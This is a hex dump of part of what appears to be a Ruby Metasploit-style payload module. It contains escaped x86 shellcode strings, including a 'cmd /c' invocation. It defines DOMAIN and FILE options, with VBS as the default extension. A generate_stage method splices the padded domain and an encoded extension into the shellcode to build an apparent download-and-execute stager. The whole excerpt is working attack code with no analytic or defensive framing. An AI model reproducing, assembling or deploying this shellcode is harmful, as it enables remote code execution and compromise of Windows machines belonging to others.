00001110  78 30 38 5c 78 34 30 5c  78 38 61 5c 78 65 30 5c  |x08\x40\x8a\xe0\|
00001120  78 43 30 5c 78 45 43 5c  78 30 34 5c 78 32 34 5c  |xC0\xEC\x04\x24\|
00001130  78 30 46 5c 78 30 35 5c  78 36 31 5c 78 36 31 5c  |x0F\x05\x61\x61\|
00001140  78 36 31 5c 78 36 31 5c  78 35 30 5c 78 65 39 5c  |x61\x61\x50\xe9\|
00001150  78 34 36 5c 78 66 66 5c  78 66 66 5c 78 66 66 5c  |x46\xff\xff\xff\|
00001160  78 38 62 5c 78 34 36 5c  78 66 38 5c 78 35 30 5c  |x8b\x46\xf8\x50\|
00001170  78 66 66 5c 78 35 36 5c  78 66 63 5c 78 36 36 5c  |xff\x56\xfc\x66\|
00001180  78 62 38 5c 78 32 32 5c  78 30 35 5c 78 30 33 5c  |xb8\x22\x05\x03\|
00001190  78 65 30 22 2b 22 5c 78  36 38 5c 78 32 66 5c 78  |xe0"+"\x68\x2f\x|
000011a0  36 33 5c 78 32 30 5c 78  32 32 5c 78 36 38 5c 78  |63\x20\x22\x68\x|
000011b0  36 33 5c 78 36 64 5c 78  36 34 5c 78 32 30 5c 78  |63\x6d\x64\x20\x|
000011c0  38 62 5c 78 63 63 5c 78  34 31 5c 78 38 61 5c 78  |8b\xcc\x41\x8a\x|
000011d0  30 31 5c 78 38 34 5c 78  63 30 5c 78 37 35 5c 78  |01\x84\xc0\x75\x|
000011e0  66 39 5c 78 63 36 5c 78  30 31 5c 78 32 32 5c 78  |f9\xc6\x01\x22\x|
000011f0  38 38 5c 78 34 31 5c 78  30 31 22 2b 22 5c 78 33  |88\x41\x01"+"\x3|
00001200  33 5c 78 63 30 5c 78 38  62 5c 78 63 63 5c 78 35  |3\xc0\x8b\xcc\x5|
00001210  30 5c 78 35 31 5c 78 66  66 5c 78 35 36 5c 78 31  |0\x51\xff\x56\x1|
00001220  63 5c 78 35 30 5c 78 66  66 5c 78 35 36 5c 78 31  |c\x50\xff\x56\x1|
00001230  38 22 20 0a 20 20 20 20  20 20 20 20 20 20 20 20  |8" .            |
00001240  20 20 20 20 20 20 20 20  20 0a 20 20 20 20 20 20  |         .      |
00001250  20 20 20 20 20 20 20 20  20 20 7d 0a 20 20 20 20  |          }.    |
00001260  20 20 20 20 20 20 20 20  29 29 0a 20 0a 20 20 20  |        )). .   |
00001270  20 20 20 20 20 23 20 57  65 20 75 73 65 20 72 74  |     # We use rt|
00001280  6c 45 78 69 74 54 68 72  65 61 64 28 30 29 0a 20  |lExitThread(0). |
00001290  20 20 20 20 20 20 20 64  65 72 65 67 69 73 74 65  |       deregiste|
000012a0  72 5f 6f 70 74 69 6f 6e  73 28 27 45 58 49 54 46  |r_options('EXITF|
000012b0  55 4e 43 27 29 0a 20 0a  20 20 20 20 20 20 20 20  |UNC'). .        |
000012c0  23 20 52 65 67 69 73 74  65 72 20 74 68 65 20 64  |# Register the d|
000012d0  6f 6d 61 69 6e 20 61 6e  64 20 63 6d 64 20 6f 70  |omain and cmd op|
000012e0  74 69 6f 6e 73 0a 20 20  20 20 20 20 20 20 72 65  |tions.        re|
000012f0  67 69 73 74 65 72 5f 6f  70 74 69 6f 6e 73 28 0a  |gister_options(.|
00001300  20 20 20 20 20 20 20 20  20 20 20 20 5b 0a 20 20  |            [.  |
00001310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 4f 70  |              Op|
00001320  74 53 74 72 69 6e 67 2e  6e 65 77 28 27 44 4f 4d  |tString.new('DOM|
00001330  41 49 4e 27 2c 20 5b 20  74 72 75 65 2c 20 22 54  |AIN', [ true, "T|
00001340  68 65 20 64 6f 6d 61 69  6e 20 6e 61 6d 65 20 74  |he domain name t|
00001350  6f 20 75 73 65 20 28 39  20 62 79 74 65 73 20 2d  |o use (9 bytes -|
00001360  20 6d 61 78 69 6d 75 6d  29 22 20 5d 29 2c 0a 20  | maximum)" ]),. |
00001370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 4f  |               O|
00001380  70 74 53 74 72 69 6e 67  2e 6e 65 77 28 27 46 49  |ptString.new('FI|
00001390  4c 45 27 2c 20 5b 20 74  72 75 65 2c 20 22 46 69  |LE', [ true, "Fi|
000013a0  6c 65 6e 61 6d 65 20 65  78 74 65 6e 73 69 6f 6e  |lename extension|
000013b0  20 28 64 65 66 61 75 6c  74 20 56 42 53 29 22 20  | (default VBS)" |
000013c0  5d 29 2c 0a 20 20 20 20  20 20 20 20 20 20 20 20  |]),.            |
000013d0  5d 2c 20 73 65 6c 66 2e  63 6c 61 73 73 29 0a 20  |], self.class). |
000013e0  20 20 20 65 6e 64 0a 20  0a 20 20 20 20 23 0a 20  |   end. .    #. |
000013f0  20 20 20 23 20 43 6f 6e  73 74 72 75 63 74 73 20  |   # Constructs |
00001400  74 68 65 20 70 61 79 6c  6f 61 64 0a 20 20 20 20  |the payload.    |
00001410  23 0a 20 20 20 20 64 65  66 20 67 65 6e 65 72 61  |#.    def genera|
00001420  74 65 5f 73 74 61 67 65  0a 20 20 20 20 20 20 20  |te_stage.       |
00001430  20 64 6f 6d 61 69 6e 20  20 3d 20 64 61 74 61 73  | domain  = datas|
00001440  74 6f 72 65 5b 27 44 4f  4d 41 49 4e 27 5d 20 7c  |tore['DOMAIN'] ||
00001450  7c 20 27 27 0a 20 20 20  20 20 20 20 20 65 78 74  || ''.        ext|
00001460  65 6e 73 20 20 3d 20 64  61 74 61 73 74 6f 72 65  |ens  = datastore|
00001470  5b 27 46 49 4c 45 27 5d  20 7c 7c 20 27 76 62 73  |['FILE'] || 'vbs|
00001480  27 0a 20 20 20 20 20 20  20 20 20 0a 20 20 20 20  |'.         .    |
00001490  20 20 20 20 23 20 5c 22  78 36 36 5c 78 37 39 5c  |    # \"x66\x79\|
000014a0  78 36 36 5c 78 30 31 22  0a 20 20 20 20 20 20 20  |x66\x01".       |
000014b0  20 65 78 74 4c 65 6e 3d  65 78 74 65 6e 73 2e 6c  | extLen=extens.l|
000014c0  65 6e 67 74 68 0a 20 20  20 20 20 20 20 20 20 0a  |ength.         .|
000014d0  20 20 20 20 20 20 20 20  77 68 69 6c 65 20 65 78  |        while ex|
000014e0  74 65 6e 73 2e 6c 65 6e  67 74 68 3c 34 0a 20 20  |tens.length<4.  |
000014f0  20 20 20 20 20 20 20 20  20 20 65 78 74 65 6e 73  |          extens|
00001500  3d 65 78 74 65 6e 73 2b  22 5c 78 30 31 22 0a 20  |=extens+"\x01". |
00001510  20 20 20 20 20 20 20 65  6e 64 0a 20 20 20 20 20  |       end.     |
00001520  20 20 20 20 0a 20 20 20  20 20 20 20 20 69 3d 30  |    .        i=0|
00001530  0a 20 20 20 20 20 20 20  20 77 68 69 6c 65 20 69  |.        while i|
00001540  3c 65 78 74 4c 65 6e 0a  20 20 20 20 20 20 20 20  |<extLen.        |
00001550  20 20 20 20 65 78 74 65  6e 73 5b 69 2c 31 5d 3d  |    extens[i,1]=|
00001560  28 65 78 74 65 6e 73 5b  69 5d 2e 6f 72 64 2b 31  |(extens[i].ord+1|
00001570  29 2e 63 68 72 0a 20 20  20 20 20 20 20 20 20 20  |).chr.          |
00001580  20 20 69 3d 69 2b 31 0a  20 20 20 20 20 20 20 20  |  i=i+1.        |
00001590  65 6e 64 0a 20 20 20 20  20 20 20 20 20 0a 20 20  |end.         .  |
000015a0  20 20 20 20 20 20 77 68  69 6c 65 20 64 6f 6d 61  |      while doma|
000015b0  69 6e 2e 6c 65 6e 67 74  68 3c 31 30 0a 20 20 20  |in.length<10.   |
000015c0  20 20 20 20 20 20 20 20  20 64 6f 6d 61 69 6e 3d  |         domain=|
000015d0  64 6f 6d 61 69 6e 2b 22  5c 78 46 46 22 0a 20 20  |domain+"\xFF".  |
000015e0  20 20 20 20 20 20 65 6e  64 0a 20 20 20 20 20 20  |      end.      |
000015f0  20 20 20 0a 20 20 20 20  20 20 20 20 64 6f 6d 61  |   .        doma|
00001600  69 6e 3d 22 5c 78 32 65  22 2b 64 6f 6d 61 69 6e  |in="\x2e"+domain|
00001610  0a 20 20 20 20 20 20 20  20 20 0a 20 20 20 20 20  |.         .     |
00001620  20 20 20 70 61 79 6c 6f  61 64 3d 6d 6f 64 75 6c  |   payload=modul|
00001630  65 5f 69 6e 66 6f 5b 27  50 61 79 6c 6f 61 64 27  |e_info['Payload'|
00001640  5d 5b 27 42 65 67 69 6e  27 5d 20 2b 20 64 6f 6d  |]['Begin'] + dom|
00001650  61 69 6e 20 2b 20 6d 6f  64 75 6c 65 5f 69 6e 66  |ain + module_inf|
00001660  6f 5b 27 50 61 79 6c 6f  61 64 27 5d 5b 27 50 61  |o['Payload']['Pa|
00001670  79 6c 6f 61 64 31 27 5d  20 2b 20 65 78 74 65 6e  |yload1'] + exten|
00001680  73 20 2b 20 6d 6f 64 75  6c 65 5f 69 6e 66 6f 5b  |s + module_info[|
00001690  27 50 61 79 6c 6f 61 64  27 5d 5b 27 50 61 79 6c  |'Payload']['Payl|
000016a0  6f 61 64 32 27 5d 0a 20  20 20 20 20 20 20 20 20  |oad2'].         |
000016b0  20 20 20 20 20 20 20 20  0a 20 20 20 20 20 20 20  |        .       |
000016c0  20 72 65 74 75 72 6e 20  70 61 79 6c 6f 61 64 0a  | return payload.|
000016d0  20 20 20 20 65 6e 64 0a  20 0a 65 6e 64           |    end. .end|
000016dd
